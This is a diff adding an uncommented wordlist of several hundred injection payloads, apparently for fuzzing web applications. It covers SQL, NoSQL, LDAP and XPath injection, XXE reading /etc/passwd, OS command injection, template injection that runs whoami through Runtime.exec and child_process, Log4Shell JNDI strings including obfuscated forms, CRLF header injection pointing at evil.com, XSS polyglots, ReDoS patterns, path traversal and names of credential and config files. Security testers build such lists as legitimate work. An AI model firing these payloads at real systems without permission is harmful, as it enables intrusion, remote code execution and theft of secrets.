@@ -1,0 +1,522 @@
+'
+"
+`
+''
+""
+``
+'''
+"""
+```
+'||'
+"||"
+'/*
+'*/
+"/*
+"*/
+';--
+";--
+'#
+"#
+';#
+";#
+'UNION
+"UNION
+admin'--
+admin"--
+admin';#
+admin";#
+admin'/*
+admin"/*
+1'
+1"
+1`
+-1'
+-1"
+0'
+0"
+x'
+x"
+test'
+test"
+'=''
+"=""
+'='
+"="
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+") OR ("1"="1
+'||1||'
+"||1||"
+sleep(5)
+SLEEP(5)
+pg_sleep(5)
+waitfor delay '00:00:05'
+benchmark(5000000,md5(1))
+'||sleep(5)||'
+"||sleep(5)||"
+'+sleep(5)+'
+"+sleep(5)+"
+';sleep(5);--
+";sleep(5);--
+{"$gt":""}
+{"$ne":null}
+{"$regex":".*"}
+{"$where":"1==1"}
+{"$where":"this.username"}
+[$ne]=1
+[$regex]=.*
+[$where]=1==1
+[$gt]=
+[$lt]=
+[$exists]=true
+[$exists]=false
+[$in][]=1
+[$nin][]=1
+true
+false
+null
+undefined
+[$regex]=^.*
+1;return+true
+';return+true;var+x='
+";return+true;var+x="
+*
+*)
+*))
+*()|
+*)(|
+*(|(password=*))
+*(|(objectclass=*))
+admin*
+admin*)
+admin*))
+*)(uid=*))(|(uid=*
+*)(cn=*))(|(cn=*
+)(cn=*)
+)(uid=*)
+*)(|(mail=*))
+*)(|(cn=*))
+<?xml version="1.0"?>
+<!DOCTYPE test>
+<!ENTITY test SYSTEM "file:///etc/passwd">
+<!ENTITY test SYSTEM "http://example.com">
+<xml>test</xml>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+&test;
+&#x3c;
+&#60;
+%entity;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+'or'1'='1
+"or"1"="1
+'or 1=1 or ''='
+"or 1=1 or ""="
+xpath'
+xpath"
+'] | //user/*[contains(*,'admin') and position()=1] | a['
+"] | //user/*[contains(*,'admin') and position()=1] | a["
+']/parent::*[position()=1] | a['
+"]/parent::*[position()=1] | a["
+;
+|
+&
+&&
+||
+`
+$(
+${
+$()
+${}
+%0a
+%0d
+%0d%0a
+\n
+\r
+\r\n
+;ls
+|ls
+&ls
+&&ls
+||ls
+`ls`
+$(ls)
+${ls}
+;cat /etc/passwd
+|cat /etc/passwd
+&cat /etc/passwd
+;ping -c 4 127.0.0.1
+|ping -c 4 127.0.0.1
+;sleep 5
+|sleep 5
+&sleep 5
+;whoami
+|whoami
+&whoami
+$(whoami)
+`whoami`
+${whoami}
+;id
+|id
+&id
+$(id)
+`id`
+${id}
+%00
+\x00
+\0
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{ 7*7 }}
+${ 7*7 }
+{{config}}
+{{self}}
+${java.lang.Runtime}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request}}
+{{session}}
+{{app}}
+{{g}}
+${T(java.lang.System).getProperty("user.name")}
+${T(java.lang.Runtime).getRuntime().exec("whoami")}
+#{T(java.lang.System).getProperty('user.name')}
+[[${T(java.lang.System).getProperty('user.name')}]]
+${7*7}${class.forName("java.lang.Runtime")}
+{{7*'7'}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('whoami')")()}}
+{{constructor.constructor('return process')().exit()}}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+eval(
+eval('
+eval("
+eval(`
+eval(alert(1))
+eval('alert(1)')
+eval("alert(1)")
+eval(`alert(1)`)
+system(
+exec(
+shell_exec(
+passthru(
+popen(
+proc_open(
+file_get_contents(
+include(
+require(
+include_once(
+require_once(
+__import__(
+compile(
+execfile(
+input(
+raw_input(
+<?php
+<?=
+<script language="php">
+<?php system('whoami'); ?>
+<?php echo shell_exec('whoami'); ?>
+<?php phpinfo(); ?>
+<?= phpinfo() ?>
+${@phpinfo()}
+${phpinfo()}
+#{phpinfo()}
+${@print(phpinfo())}
+${@system('whoami')}
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../../etc/passwd
+php://input
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+expect://whoami
+file:///etc/passwd
+../../../etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+....//....//....//etc/passwd
+..;/etc/passwd
+__import__
+__import__('os').system('whoami')
+eval(__import__('os').system('whoami'))
+exec(__import__('os').system('whoami'))
+compile
+execfile
+input()
+raw_input()
+file('/etc/passwd').read()
+open('/etc/passwd').read()
+__file__
+__name__
+__doc__
+__package__
+__loader__
+__spec__
+__annotations__
+__builtins__
+require('child_process')
+require('fs')
+process.env
+global.process
+child_process.exec('whoami')
+fs.readFileSync('/etc/passwd')
+Buffer
+setTimeout
+setInterval
+Function('return process')()
+this.constructor.constructor('return process')()
+arguments.callee
+arguments.caller
+eval(require)
+eval(process)
+require.main
+require.cache
+module.exports
+exports
+__dirname
+__filename
+Runtime.getRuntime()
+System.getProperty
+ProcessBuilder
+Class.forName
+java.lang.Runtime
+java.lang.System
+java.lang.ProcessBuilder
+java.io.File
+java.nio.file.Files
+getClass()
+forName(
+newInstance()
+getDeclaredMethod
+invoke(
+getMethod(
+getMethods()
+getFields()
+getDeclaredFields()
+system(
+exec(
+eval(
+%x()
+`
+Kernel.system
+Kernel.exec
+Kernel.eval
+IO.popen
+File.read
+Dir.glob
+require
+load
+autoload
+const_get
+send
+public_send
+method
+define_method
+class_eval
+instance_eval
+module_eval
+${jndi:ldap://
+${jndi:rmi://
+${jndi:dns://
+${jndi:ldap://example.com/a}
+${jndi:${lower:l}${lower:d}a${lower:p}://example.com/a}
+${${::-j}ndi:ldap://example.com/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com/a}
+${jndi:ldap://127.0.0.1/a}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//example.com/a}
+${1+1}
+#{1+1}
+*{1+1}
+@{1+1}
+~{1+1}
+${T(java.lang.System).getProperty('user.name')}
+${applicationScope}
+${sessionScope}
+${requestScope}
+${param}
+${header}
+${cookie}
+${initParam}
+${pageContext}
+%0d%0a
+%0a
+%0d
+\r\n
+\n
+\r
+%0d%0aSet-Cookie:admin=true
+%0a%0dSet-Cookie:admin=true
+\r\nSet-Cookie:admin=true
+%0d%0aLocation:http://evil.com
+\r\nLocation:http://evil.com
+%u0027
+%u0022
+%u003c
+%u003e
+%u0028
+%u0029
+%uff07
+%uff02
+%c0%27
+%c0%22
+%e0%80%a7
+%e0%80%a2
+..%c0%af
+..%c1%9c
+..%c0%2f
+..%c1%pc
+true
+false
+null
+undefined
+0
+1
+-1
+[]
+{}
+[object Object]
+NaN
+Infinity
+-Infinity
+<!--#exec cmd="whoami"-->
+<!--#exec cmd="ls"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#include virtual="/etc/passwd"-->
+<!--#include file="/etc/passwd"-->
+<!--#echo var="DATE_LOCAL"-->
+<!--#config timefmt="%A %B %d, %Y"-->
+<!--#set var="test" value="SSI"-->
+O:8:"stdClass":0:{}
+a:1:{i:0;s:4:"test";}
+C:11:"ArrayObject":19:{x:i:0;a:0:{};m:a:0:{}}
+rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+sleep(5)
+SLEEP(5)
+WAITFOR DELAY '00:00:05'
+pg_sleep(5)
+benchmark(5000000,md5(1))
+(SELECT COUNT(*) FROM ALL_USERS A, ALL_USERS B, ALL_USERS C)
+'+(select*from(select(sleep(5)))a)+'
+'+(select*from(select(sleep(5)))a union select 1)+'
+";WAITFOR DELAY '00:00:05'--
+';WAITFOR DELAY '00:00:05'--
+(a+)+$
+(a|a)*$
+(a|b)*a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$a$
+^(a+)+$
+^(a|b)*aaX
+^(([a-z])+.)+[A-Z]([a-z])+$
+(.*a){10}X
+([a-zA-Z]+)*$
+(a|b)*a$
+a{100}{100}{100}
+(?:a|b)*aaX
+(?:(?:a|b)*a){10}X
+' and (select substring(user(),1,1))='a
+' and (select substring(user(),1,1))='b
+' and (select substring(user(),1,1))='r
+' and length(user())=1--
+' and length(user())=4--
+' and length(user())=14--
+' and ascii(substring(user(),1,1))=114--
+' and ascii(substring(user(),1,1))=97--
+' and 1=1--
+' and 1=2--
+' or 1=1--
+' or 1=2--
+_method=PUT
+_method=PATCH
+_method=DELETE
+_token=
+X-CSRF-TOKEN:
+laravel_session=
+csrfmiddlewaretoken=
+X-CSRFToken:
+django-insecure-
+_csrf_token=
+csrf_token=
+authenticity_token=
+_method=patch
+_method=put
+_method=delete
+_csrf=
+X-CSRF-TOKEN:
+_method=PUT
+${@var}
+#{@var}
+@var@
+%{var}
+{var}
+{{var}}
+${{var}}
+#{{var}}
+${var}
+#{var}
+%var%
+$var
+@var
+&var;
+{@var}
+#@var
+%@var%
+$@var
+@@var
+&@var;
+\x00
+\x0a
+\x0d
+\x1a
+\x08
+\x09
+\x0b
+\x0c
+\xFF
+\xFE
+\xEF\xBB\xBF
+'
+'
+"
+"
+‚
+„
+‹
+›
+«
+»
+¿
+¡
+×
+÷
+±
+∞
+∑
+∏
+∂
+∆
+π
+Ω
+α
+β
+γ
+δ
+ε
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/version
+../../../proc/cmdline
+../../../proc/self/environ
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+web.config
+.env
+.htaccess
+wp-config.php
+config.php
+database.yml
+settings.py
+application.properties
+server.xml
+context.xml
